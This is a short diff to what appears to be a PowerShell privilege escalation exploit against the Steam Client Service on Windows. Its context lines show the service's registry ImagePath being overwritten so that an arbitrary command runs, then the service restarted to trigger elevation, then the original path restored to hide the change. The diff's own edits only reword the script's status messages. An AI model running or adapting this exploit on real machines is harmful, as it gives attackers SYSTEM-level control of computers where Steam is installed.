@@ -14,8 +14,9 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Ser
 Write-Host "[*] Binary Path overwritten, restarting the service to trigger EoP. This will error out, just ignore it"
 Get-Service "Steam Client Service" | Restart-Service
 Write-Host "[*] Done, the command $cmd has been executed"
-Write-Host "[*] Attemtping to remove leftovers and restarting steam service"
+Write-Host "[*] Restoring Binary Path on the Steam Client Service..."
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "`"C:\Program Files (x86)\Common Files\Steam\SteamService.exe`" /RunAsService"
+Write-Host "[*] Binary Path Restored, restarting the Steam Client Service..."
 Get-Service "Steam Client Service" | Restart-Service
 Get-Service "Steam Client Service"
 Write-Host "[*] Done."
